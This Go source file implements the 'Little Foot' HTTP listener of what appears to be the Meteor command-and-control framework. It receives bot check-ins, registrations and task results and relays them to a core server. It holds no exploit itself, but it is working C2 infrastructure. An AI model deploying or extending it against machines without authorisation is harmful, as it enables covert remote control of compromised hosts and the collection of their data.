package main

import (
	lUtils "github.com/degenerat3/meteor/listeners/utils"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

var (
	// PORT is the port that Little Foot comms will be recieved on, format `8080`
	PORT = os.Getenv("LF_PORT")

	// CORESERVER is the IP:Port of the Meteor core
	CORESERVER = os.Getenv("CORE_SERVER") // format: `9.9.9.9:9999`

	// LOGPATH is the output path (including fname) for the listener logs
	LOGPATH = os.Getenv("LOGPATH")

	// write info logs to this
	infoLog *log.Logger

	// write warning logs to this
	warnLog *log.Logger

	// write all errors to this
	errLog *log.Logger
)

func main() {
	infoLog, warnLog, errLog = lUtils.InitLogger(LOGPATH)
	infoLog.Println("Listening for Little_Foot connections on port: " + PORT)
	http.HandleFunc("/", status)
	http.HandleFunc("/status", status)
	http.HandleFunc("/lf", connHandle)
	portStr := ":" + PORT
	infoLog.Println(http.ListenAndServe(portStr, nil))
	return
}

func status(w http.ResponseWriter, r *http.Request) {
	resp := &mcs.MCS{
		Status: 200,
		Desc:   "Little Foot is running...\n",
	}
	rdata, _ := proto.Marshal(resp)
	w.Write(rdata)
}

func connHandle(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadAll(r.Body)
	if err != nil {
		errLog.Println(err.Error())
	}

	comms := &mcs.MCS{}
	err = proto.Unmarshal(data, comms)
	if err != nil {
		errLog.Println("Error unmarshalling client data: " + err.Error())
		return
	}
	md := comms.GetMode()
	var retData []byte
	if md == "checkin" {
		infoLog.Println("Handling checkin from bot: " + comms.GetUuid())
		retData = lUtils.HandleCheckin(comms.GetUuid(), CORESERVER)
	} else if md == "register" {
		infoLog.Println("Handling register from bot: " + comms.GetUuid())
		retData = lUtils.HandleReg(comms.GetUuid(), comms.GetInterval(), comms.GetDelta(), comms.GetHostname(), CORESERVER)
	} else if md == "addResult" {
		infoLog.Println("Handling addResult for action: " + comms.GetUuid())
		retData = lUtils.HandleAddRes(comms.GetUuid(), comms.GetResult(), CORESERVER)
	} else {
		warnLog.Println("Recieved an unknown mode")
		resp := &mcs.MCS{
			Status: 400,
		}
		retData, _ = proto.Marshal(resp)
	}
	w.Write(retData)
	return
}
